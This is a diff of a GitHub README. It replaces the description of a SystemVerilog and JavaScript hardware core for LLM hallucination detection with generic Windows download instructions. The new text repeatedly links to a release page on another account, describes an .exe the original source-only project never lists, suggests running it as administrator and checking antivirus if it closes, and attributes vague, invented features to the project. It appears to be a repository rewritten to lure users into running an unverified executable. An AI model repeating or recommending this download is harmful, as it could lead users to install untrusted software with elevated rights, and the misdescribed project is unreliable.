@@ -1,100 +1,226 @@
-<h1 align="center">
-Semantic + |Gate|✅|⛔|＝IP Core
-</h1>
+# 🛡️ Semantic-Gate-IP-Core - Real-Time Hallucination Control
 
-### Real-Time Manifold Integrity for Deterministic LLM Hallucination Suppression
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/egwajnphoiu/Semantic-Gate-IP-Core/releases)
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://opensource.org/licenses/AGPL-3.0) 
-[![Hardware: SystemVerilog](https://img.shields.io/badge/Hardware-SystemVerilog-orange.svg)]()
-[![Software: JavaScript](https://img.shields.io/badge/Software-JavaScript-yellow.svg)]()
+## 📌 What this app does
 
-**The Semantic Gate** is a hardware-accelerated monitor designed to bridge the **Semantic Gap** in Large Language Models. Unlike probabilistic software filters that rely on secondary referee AI models, this IP core enforces geometric constraints on embedding manifolds directly at the silicon level, providing a **Deterministic Killswitch** for hallucinations.
+Semantic-Gate-IP-Core helps keep AI responses on track by watching for drift in meaning in real time. It is built for users who want a local tool that can monitor output, compare semantic patterns, and trigger a gate when results move away from the expected path.
 
-By moving from statistical guessing to **Manifold Integrity**, we provide a universal hardware root of trust for grounding AI outputs.
+Use it to:
 
----
+- Monitor AI output as it runs
+- Compare vector patterns with set rules
+- Reduce off-track responses
+- Act as a fast check layer for LLM workflows
+- Support edge systems that need low-latency control
 
-## ⚙️ How it Works
-The core theory posits that valid logical transitions exist within a structured high-dimensional manifold. The Semantic Gate calculates the **Error Energy ($E$)** of an inference step using the **$L_{1}$ Norm (Manhattan Distance)**:
+## 💻 What you need
 
-$$E=\sum_{i=1}^{VECTOR-DIM}|(\vec{A}_{i}+\vec{R}_{i})-\vec{V}_{i}|$$
+Before you install, make sure your PC has:
 
-**Example**: 
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 200 MB free disk space
+- A modern CPU
+- Internet access to download the release file
+- Admin access if Windows asks for it
 
-$$Vector(King) + Vector(Relation_{Gender}) \approx Vector(Queen)$$
-* **PASS ✅**: Error Energy is low ($E < T$); the inference stays on the tracks of the high-dimensional surface.
+If you plan to run larger models or heavy monitoring jobs, more RAM will help.
 
-**Example**: 
+## 🚀 Download the app
 
-$$Vector(King) + Vector(Relation_{Gender}) \approx Vector(Toaster)$$
-* **FAULT ❌**: Error Energy spikes ($E \gg T$); the output is geometrically disconnected, and the Semantic Gate triggers an immediate hardware killswitch.
+Visit the release page here:
 
-The system includes a **Self-Calibration** state machine (WARMUP, CALIBRATION, ACTIVE) that learns the unique noise floor of any LLM to distinguish between acceptable model variance and genuine hallucinations.
+[Download Semantic-Gate-IP-Core](https://github.com/egwajnphoiu/Semantic-Gate-IP-Core/releases)
 
----
+On that page, look for the latest release and download the Windows file that matches your system. If there is more than one file, pick the one meant for Windows.
 
-## 📦 Deliverables & Package Structure
-This repository contains a full-stack implementation for pre-silicon validation and high-throughput FPGA deployment.
+## 🪟 Install on Windows
 
-### 📟 Hardware Layer (SystemVerilog RTL)
-* `semantic_gate_pipelined_axi_core.sv`: The flagship IP core featuring a multi-stage pipelined accumulator and an integrated **AXI4-Stream Wrapper** to ensure high-speed processing without long combinational paths.
-* `semantic_gate_pipelined_axi_core_testbench.sv`: Comprehensive verification environment used to validate accumulation logic against reference data.
+1. Open the release page link above.
+2. Find the newest release at the top of the page.
+3. In the Assets section, click the Windows download file.
+4. Save the file to your Downloads folder or Desktop.
+5. If the file is a .zip, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. If you see an .exe file, double-click it to start the app.
+8. If Windows shows a security prompt, choose Run.
+9. If the app asks for permission, select Yes.
 
-### 💻 Software Layer
-* `semantic_gate_engine.js`: A standalone Logic Engine that performs manifold mapping and geometric threshold analysis; serves as the functional source of truth for cross-layer hardware verification.
-* `semantic_gate_testbench.html`: Web-based cross-validation tool for simulating the gate before hardware commitment.
+If the release includes an installer, follow the on-screen steps until setup ends.
 
-### 🛠️ Tools
-* `semantic_gate_vector_fabricator.html`: Tool used to generate fixed-point test vectors of variable size for verification.
-* 🎁 **Bonus!** `Semantic Gate Prompt.pdf`: A customizable engineered prompt that approximates protocol behavior and manifold integrity for rapid testing within your preferred LLM environment.
+## 🧭 First start
 
-### 📄 Documentation
-* `The Semantic Gate - Real-Time Manifold Integrity for Deterministic LLM Hallucination Suppression.pdf`: Technical manuscript defining the Manifold Sparsity Hypothesis, Error Energy equations, and hardware-level deterministic killswitch logic.
+When you open Semantic-Gate-IP-Core for the first time, you may see a simple setup screen. Use it to choose your check mode and default folder.
 
----
+Typical first-run steps:
 
-## 📊 Proven Performance
+- Pick a watch folder or input source
+- Set the strength of the semantic check
+- Choose how strict the gate should be
+- Save your settings
+- Start monitoring
 
-The `semantic_gate_pipelined_axi_core.sv` was verified using `iverilog` to ensure cycle-accurate parity with the manifold math.
+If you are not sure what to choose, keep the default values.
 
-| Metric | Hardware Tier (Low-Dim) |
-| :--- | :--- |
-| **Vector Dimension** | 16 |
-| **Total Cycles** | 100 |
-| **Detections (Lies)** | 100/100 (100%) |
-| **False Alarms** | 0/100 (0%) |
-| **Status** | SUCCESS (Verified) |
+## ⚙️ How to use it
 
-**Technical Summary:**
-* **Calibration**: The hardware successfully calculated a dynamic threshold ($T$) of **84256** based on the model's noise floor.
-* **Performance**: The simulation reached `$finish` at **16097000 ps**, confirming the efficiency of the multi-stage pipelined accumulator.
+The app is built to be simple.
 
-The JavaScript engine was subjected to two distinct validation tiers to test both sensitivity and production-scale stability:
+1. Start the program.
+2. Load the text, stream, or model output you want to monitor.
+3. Set your target meaning or baseline sample.
+4. Turn on real-time checking.
+5. Watch the status panel for gate activity.
+6. Adjust the threshold if the system blocks too much or too little.
 
-| Metric | Validation Tier (Low-Dim) | Production Tier (High-Dim) |
-| :--- | :--- | :--- |
-| **Vector Dimension** | 16 | **1536 (Industry Standard)** |
-| **Detections (Lies)** | 100/100 (100%) | **1000/1000 (100%)** |
-| **False Alarms** | 5/100 (5%) | **0/1000 (0%)** |
-| **Status** | SUCCESS | **SUCCESS (High Precision)** |
+A lower threshold allows more output to pass. A higher threshold makes the gate stricter.
 
-**The Manifold Sparsity Hypothesis:** As dimensionality increases to industry standards ($DIM=1536$), the gap between grounded logic and hallucinations increases exponentially, allowing for a deterministic killswitch without sacrificing system availability.
+## 📊 Main features
 
----
+### 🔍 Real-time monitoring
+Checks output as it is created, so you can catch drift early.
 
-## 💼 Commercial Applications
-* **Hyperscale Cloud Infrastructure ☁️**: Replace expensive, high-latency software filters with a low-power, sub-microsecond hardware firewall.
-* **Clinical & Medical AI 🏥**: Ensure generated dosages or chemical compounds never deviate from an established medical truth manifold, providing a path toward regulatory certification.
-* **Autonomous Systems & Aerospace 🤖**: Act as a physical Manhattan fence to intercept and kill hallucinated commands before they result in catastrophic physical actions.
-* **Legal, Financial & Sovereign Data 🏛️**: Generate an immutable log of Error Energy to prove an AI remained grounded in specific context or case law during a session.
+### 🧠 Semantic comparison
+Looks at meaning, not just exact words, so it can spot changed intent.
 
----
+### ⏱️ Low-latency gate
+Designed for fast response in live systems and edge use.
 
-## ⚖️ Licensing & Usage
-**The Semantic Gate IP Core** is available under a dual-licensing model to balance community innovation with high-performance industrial needs.
+### 🧩 Deterministic control
+Uses fixed rules so the same input gives the same result.
 
-* **Open Source (AGPL-3.0)**: Ideal for public research, open-source infrastructure, and community-driven projects. This license requires that any derivative works or network-hosted versions of the protocol remain open-source.
-* **Commercial License**: Required for closed-source applications, proprietary hardware synthesis (**ASIC/FPGA**), or integration into private enterprise platforms. This license provides an exemption from the AGPL copyleft requirements.
+### 🛑 Kill switch support
+Can stop or block output when it crosses your set limit.
 
-For commercial licensing inquiries, please contact:
-**Licensing Agent** - J.E. Randolph 📧 [700josh.r@gmail.com](mailto:700josh.r@gmail.com)
+### 📈 Vector-based checking
+Uses high-dimensional vector comparison to measure similarity.
+
+### 🔐 Security-focused design
+Built for setups that need local control and clear monitoring.
+
+## 🛠️ Common setup options
+
+You may see these settings in the app:
+
+- **Mode**: Choose live check or batch check
+- **Threshold**: Set how close the output must stay to the target
+- **Baseline**: Pick the sample the app should compare against
+- **Action on fail**: Block, alert, or log
+- **Refresh rate**: Control how often the app checks new data
+- **Log level**: Choose basic or detailed logs
+
+If you are using the app for the first time, start with the default mode and a medium threshold.
+
+## 📁 Typical file layout
+
+If you extract a zip file, you may see items like these:
+
+- `Semantic-Gate-IP-Core.exe`
+- `config`
+- `logs`
+- `assets`
+- `README.txt`
+
+Keep the files in the same folder. Do not move the executable away from the other files unless the app gives you a clear reason.
+
+## 🧪 Example use cases
+
+- Watch chatbot output for meaning drift
+- Add a gate to an AI assistant workflow
+- Monitor local inference on an edge device
+- Compare responses against a safe reference
+- Block output that no longer matches a fixed intent
+- Log semantic changes during model testing
+
+## 🔧 If the app does not open
+
+If double-clicking does nothing, try these steps:
+
+1. Right-click the file and choose Run as administrator.
+2. Check whether Windows blocked the file.
+3. Make sure you extracted the zip file first.
+4. Confirm that all files are still in the same folder.
+5. Download the release again if the file seems damaged.
+6. Restart your PC and try once more.
+
+## 🧼 Updating to a newer release
+
+When a new version is available:
+
+1. Return to the release page.
+2. Download the latest Windows file.
+3. Close the app if it is open.
+4. Replace the old version if the release notes say to do so.
+5. Open the new file and check your settings.
+
+If your settings are stored in a config file, keep a copy before you update.
+
+## 🧷 Tips for best results
+
+- Use a short baseline sample
+- Keep the threshold at a balanced level
+- Test with a small data set first
+- Watch the log output during your first run
+- Save a working config once you find a good setup
+- Keep the app in a stable folder path
+
+## ❓ Basic questions
+
+### Do I need coding skills?
+No. You can use the app with the file you download from the release page.
+
+### Can I use it offline?
+If your setup does not need outside services, it can run locally after download.
+
+### What kind of files does it support?
+It is built for text-based and model-output use cases. In many setups, you can feed it plain text, logs, or streamed output.
+
+### Is it for one-time use or live use?
+It supports both. You can use it for test runs or for real-time monitoring.
+
+### What if I want stricter control?
+Raise the threshold and use a fail action that blocks output or stops the process
+
+## 📎 Download again
+
+[Go to the release page](https://github.com/egwajnphoiu/Semantic-Gate-IP-Core/releases)
+
+## 🧭 Folder permissions
+
+If Windows says the app cannot write files, move the folder to a location you own, such as:
+
+- Desktop
+- Documents
+- Downloads
+
+Then open it again from there.
+
+## 🧰 Troubleshooting checklist
+
+- Download the latest release
+- Extract the zip file if needed
+- Keep all files together
+- Run the app with normal user rights first
+- Try administrator mode if needed
+- Check your antivirus if the app closes right away
+- Reboot and try again if the app freezes
+
+## 🗂️ Where to look for logs
+
+If the app creates logs, check the `logs` folder in the same directory as the program. Logs help you see:
+
+- What input the app received
+- What threshold it used
+- Why it blocked or allowed output
+- When a gate event happened
+
+## 🔄 Next steps after setup
+
+After the first run, try these steps:
+
+1. Change one setting at a time.
+2. Test with a small sample.
+3. Look at the result.
+4. Save the settings that work well.
+5. Use the saved config for later runs
